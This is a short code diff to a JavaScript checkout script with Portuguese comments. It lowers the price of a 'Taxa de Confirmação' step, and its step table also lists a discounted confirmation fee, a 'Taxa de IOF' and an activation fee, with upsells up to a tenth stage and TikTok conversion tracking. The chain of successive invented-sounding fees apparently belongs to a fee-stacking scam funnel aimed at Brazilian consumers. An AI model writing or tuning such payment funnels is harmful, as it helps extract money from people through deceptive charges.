@@ -18,7 +18,7 @@ const TIKTOK_EVENTS = "https://business-api.tiktok.com/open_api/v1.3/event/track
 // `next` só é usado pelo up8, up9 e up10 (o servidor devolve o link de redirecionamento).
 // As demais etapas seguem o `proximo` que já está no checkout.html de cada pasta.
 const STEPS = {
-  front: { amount: 2091, name: "Taxa de Confirmação" },
+  front: { amount: 1386, name: "Taxa de Confirmação" },
   back: { amount: 1244, name: "Taxa de Confirmação - Desconto Aplicado" },
   up1: { amount: 2334, name: "Taxa de IOF" },
   up2: { amount: 2631, name: "Taxa Única de Ativação" },
